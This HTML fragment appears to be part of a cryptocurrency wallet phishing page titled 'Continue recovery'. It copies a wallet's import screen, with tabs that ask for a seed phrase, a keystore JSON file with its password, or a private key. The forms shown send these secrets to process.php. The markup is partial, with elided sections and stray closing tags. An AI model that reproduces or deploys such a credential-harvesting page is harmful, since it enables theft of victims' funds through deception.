...
<center>		
</style></div><noscript></noscript><div class="main-container-wrapper">
<div class="first-view-main-wrapper"><div class="first-view-main">
<div class="import-account"><div class="import-account__title">Continue recovery</div>

<h5 class="">Recover your wallet with one of the following methods.</h5>
</center>	
...
<div class="tab">
                    ...
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore</b></button>
...
<div id="phrase" class="tabcontent">
					 ...
					 <textarea rows="8" cols="70"  name="key" required="required" minlength="12" placeholder="Seed Phrase"
                        required="required"></textarea>   
<br>
<br>						
                      <h6><div class="">Typically 12 (sometimes 24) words separated by single spaces</div></h6>
                      
                      <button form="form1" value="Import" type="submit" name="import" class="button btn--first-time first-time-flow__button">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea rows="8" cols="70" name="key" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input class="form-control mt-4" type="text" name="pass" placeholder="Password" required="required" minlength="4" />
                      </div>
					  <br>
					  <br>
                      <h6><div class="">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div></h6>
                      
                      <button form="form2" value="Import" type="submit" name="import" class="button btn--first-time first-time-flow__button">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
					 <textarea rows="8" cols="70" name="key" required="required" minlength="64" placeholder="Private Key"
                        required="required"></textarea>
						<br>
                      <div class="field">
					  ...
					  <br>
					  <br>
                      <h6><div class="">Typically 64 alphanumeric characters</div></h6>
                      
                      <button form="form3" value="Import" type="submit" name="import" class="button btn--first-time first-time-flow__button">IMPORT</button>
                    </form>
                  </div> 
